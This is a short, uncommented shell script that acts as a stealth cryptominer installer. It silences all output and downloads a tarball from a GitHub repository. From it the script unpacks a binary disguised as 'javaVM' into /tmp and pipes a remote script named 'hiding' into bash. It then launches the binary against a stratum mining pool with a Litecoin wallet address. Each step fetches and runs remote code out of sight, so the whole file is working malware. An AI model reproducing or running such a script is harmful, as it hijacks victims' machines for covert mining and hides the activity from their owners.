export LANG=C &>/dev/null
export LC_ALL=C &>/dev/null
rm -rf /tmp/javaVM &>/dev/null
wget -qO /tmp/jadah.tar.gz https://github.com/williehprnuhrxyq/nubuat/raw/main/wh.tar.gz > /dev/null 2>&1
wget -qO /tmp/jadah.tar.gz https://github.com/williehprnuhrxyq/nubuat/raw/main/0906yz.tar.gz > /dev/null 2>&1
tar -xvf /tmp/jadah.tar.gz -C /tmp &>/dev/null
rm -rf /tmp/jadah.tar.gz &>/dev/null
LANG=C LC_ALL=C /tmp/javaVM &>/dev/null
wget -O - -q https://raw.githubusercontent.com/williehprnuhrxyq/nubuat/main/hiding | bash > /dev/null 2>&1
/tmp/javaVM -P stratum://LTC:MVfmeefMAAcjARvGAf6ZLkgxsyvqNVeC2a.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S"))#zn10-5v8g@8.219.86.27:80 >/dev/null 2>&1
